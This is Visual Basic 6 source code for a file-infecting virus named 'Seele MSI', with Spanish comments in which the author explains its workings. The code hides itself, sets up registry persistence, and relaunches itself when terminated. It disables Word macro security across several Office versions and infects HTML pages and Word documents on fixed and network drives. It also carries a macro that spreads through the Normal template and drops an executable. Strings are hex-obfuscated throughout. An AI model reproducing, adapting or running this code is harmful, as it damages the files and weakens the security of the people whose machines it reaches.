VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Winword"
   ClientHeight    =   90
   ClientLeft      =   -120
   ClientTop       =   -120
   ClientWidth     =   90
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   600
      Top             =   120
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   120
      Top             =   120
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Nombre: Seele MSI
'Autora: (º.º)( )¦?(_) $ /·\
'Origen: México
'Tamaño: lof(dirvir) ja ja ja xD
'Payload: Ver en Timer1_timer
'Resolucion del codigo: 1024 * 720 para porder ver los comentarios
'Descripción: Este Virus infecta docuemtos de Word, paginas html y htm.


'Aunque este virus está un poco complicado para explicarlo comprenderlo espero y se
'entiendan su código, será muy aburrido pero al final diran que sólo es la encripta-
'cion de este, Fabricación 100% Mexicana y Reitero por aquellos envidiosos que di-
'cen que las mujeres no sirven para nada, lo hize yo, una Mujer.
'Investiguen Sobre Gibabyte, también es una mujer y de las mejores.


'/*El tamaño de este virus es muy grande, al principio era de 40 kb y ahora se in-
'cremento a 84 kb esto nos representa algo alarmante ya que su propagación será
'más lenta pero esto lo tengo en cuenta pero es una deficiencia de los virus
'*/así ke tomen tambien en cuenta el tamaño del archivo.
'Destinado para antes del 14 de Febrero del 2005
'Fallo lo del 14 de febrero ahora es para el 11 de marzo, Primero tenía mucha
'tarea y luego los examenes, y luego Taba Malita, ;-D, pero en fin
'Fallo lo del 11 de marzo ahora, está terminado por fin después de tantos incon-
'venientes que se me atravesaron (16 de Marzo de 2005).
Dim ya, infectadoword As Boolean
Private Sub Form_Load()
App.TaskVisible = False
Call mpl
Call cargarwssyfso                                '.exe
dirvir = fso.buildpath(App.Path, App.EXEName & d("1F644B64"))
Call residente
If chkdo = False Then
    Call cargarvar
    Call buscarendrives
End If
Timer1.Enabled = True
End Sub
Function mpl()
'Nos sirve para poder ejecutar el payload

Randomize
If Int(Rnd * 30) = 0 Then mostrarpayload = True
End Function
Sub residente()
 'Escribe la cadena del regedit por si la borran, entonces se volverá a escribir
 'en este
 
 wss.regwrite d("794A7F4C6951586445755070545F7C6A51715D705D65465F646A5D675C74405F77714676516A40525076466D5A6A6956436A6A535F6A165C47246561546B416143"), dirvir
End Sub
Sub activarmacroyvbproyectos()
'/*Para obtener la versión de Word
'MsgBox Application.Version

'Pero como tengo mucha flojera por todo este código, entonces lo haré de esta otra
'forma xD


'11.0 Office 2003
'wss.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Security\Level", 1, "REG_DWORD"
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F32052A0458636B46606957506740765C704F587A6140615A"), 1, "REG_DWORD"
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F32052A0458636B46606957506740765C704F58726B587062764277434D597743655D685460776D5D6142"), 0, "REG_DWORD"
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F32052A0458636B46606957506740765C704F5877675561457761467849"), 1, "REG_DWORD"
'10.0 Office Xp
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F32042A0458636B46606957506740765C704F587A6140615A"), 1, "REG_DWORD"
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F32042A0458636B46606957506740765C704F58726B587062764277434D597743655D685460776D5D6142"), 0, "REG_DWORD"
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F32042A0458636B46606957506740765C704F5877675561457761467849"), 1, "REG_DWORD"
'9.0  Office 2000
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F3A1A3468535B76505866615671476D417D6A4853725368"), 1, "REG_DWORD"
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F3A1A3468535B76505866615671476D417D6A40596A4250447144707E6A447056685D61554258685477"), 0, "REG_DWORD"
'8.0  Office 97
wss.regwrite d("794A70546951586445755070545F7C6A51715D705D65465F7C65556A50666F3B1A3468535B76505866615671476D417D6A4853725368"), 1, "REG_DWORD"
'wss.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security\DontTrustInstalledFiles", 0, "REG_DWORD"
End Sub
Sub buscarendrives()
'Como su nombre lo dice, busca en los drives que sean de tipo Fixed como el disco
'duro o Network que son las que son conectadas en "Conectar unidad de red"

Dim drive, uni
On Error Resume Next
Set uni = fso.Drives
For Each drive In uni
    'Fixed= 2              'Network = 3
If uni.DriveType = 2 Or uni.DriveType = 3 Then
  Call buscar(drive & "\")
End If
Next
End Sub
Private Sub Form_Terminate()
'Si se termina la forma entonces ejecuto de nuevo el virus para que no se pueda
'finalizar tan fácilmente

Shell dirvir
End Sub

Private Sub Timer1_Timer()
'Mando llamar a residente para que se escriba la cadena para ejecutarse cada vez -
'que inicie windows, activarmacroyvbproyectos para poder infectar archivos de word
'en caso de que se modifiquen las opciones de hacerlo.
'Mostrar payload pues sólo cuando esta habilitado se ejecuta ya que este copia al
'Portapapeles unos textos lo cualoes siempre estarán en este para que el usuario al
'momento de pegar,  pegará el texto antes mencionado. ;-)

Call residente
Call activarmacroyvbproyectos
If mostrarpayload = True Then Call mostrar
End Sub

Private Sub Timer2_Timer()

Static i As Integer
i = i + 1
If i = 20 Then
 i = 0
 ya = True
 Timer2.Enabled = False
End If
End Sub


Sub buscar(dir)
'Hace la búsqueda de los archivos htm,html y doc para infectarlos

On Error Resume Next
Dim a, b, c, d, e, f
Set b = fso.getfolder(dir).Files
DoEvents
For Each f In b
 Select Case LCase(fso.getextensionname(f.Path))
  Case "htm":
pagi:
                         c = fso.GetFileName(f.Path)
                         Debug.Print fso.buildpath(dir, c)
                         'MsgBox "pagina web -> " & c
                         Call infectar(fso.buildpath(dir, c))
  Case "html":
                         GoTo pagi
  Case "doc":
                         c = fso.GetFileName(f.Path)
                         'Debug.Print fso.buildpath(dir, c)
                         Call infectard(fso.buildpath(dir, c))
                         infectadoword = True
  End Select
  
DoEvents
Next
Set d = fso.getfolder(dir).subfolders
For Each e In d
 buscar e.Path
Next
End Sub
Sub infectar(pagina As String)
'Se infectan los archivos htm y html

Dim pag As String
Dim pag2 As String
On Error GoTo err
SetAttr pagina, vbNormal
Open pagina For Binary As #1
pag = Space(LOF(1))
Get #1, , pag
                         '<body
body = InStr(1, pag, d("0D635C654C"), vbTextCompare)
'                           <body                OnLoad=morusa
pag2 = pogidoc & vbCrLf & d("0D635C654C") & d("114E5D4D5A63533F5C6D4377426211") & Mid(pag, body + 5, Len(pag) - 4)
pag = Mid(pag, 1, body - 1) & pag2
Close #1
'*********************************************************************
'Open "C:\temp.htm" For Binary As #2
Open pagina For Binary As #2
Put #2, , pag
Close #2
err:
Close #1
Close #2
End Sub
Sub infectard(documento As String)
'Se infectan los archivos de tipo Doc, aqui prodria ahorrarme codigo para
'no crear el objeto word.application pero ando muy apurada y ya es hora
'de que salga
If EstaWordejecutandose = True Then Exit Sub
On Error GoTo err
Dim word

                              'word.application
Set word = CreateObject(d("466E41651B6347725D6B5263456A5E6D"))
'***************************************************************************
word.Documents.Open FileName:=documento                       'Morusa
If word.ActiveDocument.VBProject.VBComponents.Item(1).Name = d("7C6E41744663") Then
salir:
  '''''''''''''''''''''''''''''''''''''''''''''''''''''''
  word.Documents(word.ActiveDocument.Name).Close False
  word.quit
  Exit Sub
End If
'******************************************                                'C:\Windows\System32\asurom.dll
word.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.addfromfile (fso.buildpath(fso.getspecialfolder(1), d("507246735A6F19665D6E")))
'word.Visible = True
word.Documents(word.ActiveDocument.Name).Close True
word.quit
Timer2.Enabled = True
ya = False
Call pause
Set word = Nothing
Exit Sub
err:
Set word = Nothing
'MsgBox error(err) 'con err obtengo el numero del error y con error obtengo la informacion
GoTo salir
End Sub
Sub pause()
'Pausar mientras se cierra el objeto word
 While ya = False
   DoEvents
 Wend
End Sub

                        '//****Codigo de la Macro ****\\'

'Codigo insertado primero
'/****************************
'Private Sub Document_Close()
'Dim exe As String
'/****************************
Rem codigo para insertar después
'exe = ""
'
'
'Dim stringargs As String
'Dim stringargz As String
'Dim stringargc As String
'Dim sipo As Boolean
'Dim zipo As Boolean
'Dim cipo As Boolean
'Dim znn As Boolean
'Dim zgecd As Boolean
'Dim ret As String
'Dim fri_lili As Integer
'Dim jmp As Boolean
'Dim fri_rosa
'Dim fri_adri
'Set fso = CreateObject("scripting.filesystemobject")
'Set wss = CreateObject("wscript.shell")
'Set norma = word.NormalTemplate.VBProject.VBComponents
'Set biri = word.ActiveDocument.VBProject.VBComponents
'If norma.Item(1).Name <> "morusa" Then
'If norma.Item(1).CodeModule.countoflines <> 0 Then Set fri_rosa = norma: fri_lili = norma.Item(1).CodeModule.countoflines: jmp = False: GoTo rollover
'reelneg:
'Set fri_rosa = norma
'Set fri_adri = biri
'fri_lili = fri_adri.Item(1).CodeModule.countoflines
'jmp = False
'GoTo ntsiete
'gen:
'norma.Item(1).Name = "morusa"
'Else
'If biri.Item(1).CodeModule.countoflines <> 0 Then Set fri_rosa = biri: fri_lili = biri.Item(1).CodeModule.countoflines: jmp = True: GoTo rollover
'reeltac:
'Set fri_rosa = biri
'Set fri_adri = norma
'fri_lili = fri_adri.Item(1).CodeModule.countoflines
'jmp = True
'GoTo ntsiete
'act:
'biri.Item(1).Name = "morusa"
'End If
'On Error GoTo error
'zipo = True
'stringargs = exe
'GoTo gatito
'ana_paty:
'zipo = False
'exe = stringargs
'stringargs = "57696E6C6F676F6E2E657865"
'sipo = False
'GoTo gatito
'wind:
'sip = fso.fileexists(fso.buildpath(fso.getspecialfolder(0), stringargs))
'If sip = False Then
'Open fso.buildpath(fso.getspecialfolder(0), stringargs) For Binary As #1
'Put #1, , exe
'Close #1
'Set ml = fso.getfile(fso.buildpath(fso.getspecialfolder(0), stringargs))
'wss.Run ml.shortpath
'End If
'Exit Sub
'error:
'znn = True
'stringargs = "4D79446F63756D656E7473"
'sipo = True
'GoTo gatito
'midi:
'sipo = False
'stringargs = "57696E776F72642E657865"
'cipo = True
'zgecd = True
'GoTo gatito
'idim:
'sip = fso.fileexists(fso.buildpath(fso.getspecialfolder(0), stringargc))
'If sip = False Then
'sip = fso.fileexists(fso.buildpath(wss.specialfolders(stringargz), stringargs))
'If sip = False Then
'Open fso.buildpath(wss.specialfolders(stringargz), stringargs) For Binary As #1
'Put #1, , exe
'Close #1
'Set ml = fso.getfile(fso.buildpath(wss.specialfolders(stringargz), stringargs))
'wss.Run ml.shortpath
'End If
'End If
'Exit Sub
'gatito:
'ret = ""
'j = 1
'While j < Len(stringargs)
'  aux = Chr(CInt("&h" & Mid(stringargs, j, 2)))
'  ret = ret & aux
'  j = j + 2
'  DoEvents
'Wend
'If znn = False Then
' stringargc = ret
' stringargs = ret
'ElseIf zgecd = False Then
' stringargz = ret
'Else
' stringargs = ret
'End If
'If sipo = True Then
'GoTo midi
'ElseIf zipo = True Then
'GoTo ana_paty
'ElseIf cipo = True Then
'GoTo idim
'Else
'GoTo wind
'End If
'Exit Sub
'Dim tang
'ntsiete:
'While fri_lili > 0
'Set kittie = fri_adri.Item(1)
'Set kittie = kittie.CodeModule
'pochaco = kittie.Lines(fri_lili, 1)
'Set tang = fri_rosa.Item(1)
'Set tang = tang.CodeModule
'GoTo tiger
'winnie:
'fri_lili = fri_lili - 1
'Wend
'If jmp = False Then
'GoTo gen
'Else
'GoTo act
'End If
'tiger:
'tang.insertlines 1, pochaco
'GoTo winnie
'rollover:
'fri_rosa.Item(1).CodeModule.DeleteLines 1, fri_lili
'If jmp = False Then
'GoTo reelneg
'Else
'GoTo reeltac
'End If
'End Sub
'
'
